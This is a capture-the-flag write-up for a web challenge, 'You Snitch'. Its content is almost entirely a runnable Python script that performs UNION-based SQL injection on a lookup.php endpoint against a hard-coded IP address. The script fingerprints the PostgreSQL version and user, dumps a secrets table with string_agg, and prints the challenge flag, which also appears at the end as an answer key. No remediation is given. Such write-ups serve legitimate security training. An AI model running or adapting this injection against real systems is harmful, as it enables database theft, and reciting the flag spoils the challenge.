---
title: "You Snitch"
ctf: "Safaricom CTF"
date: 2026-10-04
category: web
difficulty: medium
points: 450
flag_format: "safctf{...}"
author: "Strawhats"
---

# You Snitch

## Summary

Target: `http://54.72.82.22:8140` (Apache/2.4.68 Debian, PHP/8.3.35)

## Solution

### Step 1: Run the solve script:

```python
#!/usr/bin/env python3
"""
Solve: You Snitch (WEB, 450 pts) -- http://<target>:8140

Vuln: /lookup.php concatenates the `name` request parameter straight into a
PostgreSQL query that returns case names:

    SELECT name FROM <cases> WHERE name = '$name'

Single-quote breaks the query (HTTP 503 "Archive database is starting"); no
error detail is echoed, but the result list *is* rendered, so this is a
classic UNION-based SQL injection with a single visible column:

    ' UNION SELECT <expr>--        (trailing space required by Pg SQL comment)

Data source: /secrets.zip on the site leaks Postgres creds (unrelated to the
exploit path but confirms the DB). The flag lives in table `super_secret`,
column `secret`.

Usage:  python3 solve.py [base_url]
        python3 solve.py http://54.72.82.22:8140
"""
import re
import sys

import requests

TARGET = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://54.72.82.22:8140"
LOOKUP = TARGET + "/lookup.php"

# Only one column is selectable through the injection; string_agg / concatenation
# lets us pull whole result sets in a single request.
SQL = "string_agg(secret, ' | ') FROM super_secret"


def sqli(expr, timeout=30):
    """Run `expr` as the injected single-column SELECT; return list of <li> rows."""
    payload = "zz' UNION SELECT " + expr + "-- "
    r = requests.get(LOOKUP, params={"name": payload}, timeout=timeout)
    if r.status_code != 200:
        raise RuntimeError(f"HTTP {r.status_code}: {r.text.strip()[:120]}")
    m = re.search(r"<ul>(.*?)</ul>", r.text, re.S)
    if not m:
        raise RuntimeError("no result list in response")
    rows = re.findall(r"<li>(.*?)</li>", m.group(1), re.S)
    # HTML-unescape the entity-encoded flag
    return [requests.utils.unquote(row.replace("&gt;", ">").replace("&lt;", "<")
                                   .replace("&amp;", "&").replace("&#039;", "'")) for row in rows]


def main():
    # Sanity probe: version() proves the injection is live.
    print("[*] version:", sqli("version()")[0])
    print("[*] current_user:", sqli("current_user")[0])

    print("[*] extracting super_secret.secret ...")
    for row in sqli(SQL):
        print("[+] secret:", row)
        for flag in re.findall(r"safctf\{[0-9a-fA-F]{32}\}", row):
            print("[+] FLAG:", flag)
            return flag
    raise SystemExit("no flag found")


if __name__ == "__main__":
    main()

```

## Flag

```
safctf{73c4979d1dccb358dbfbaca5233666ca}
```
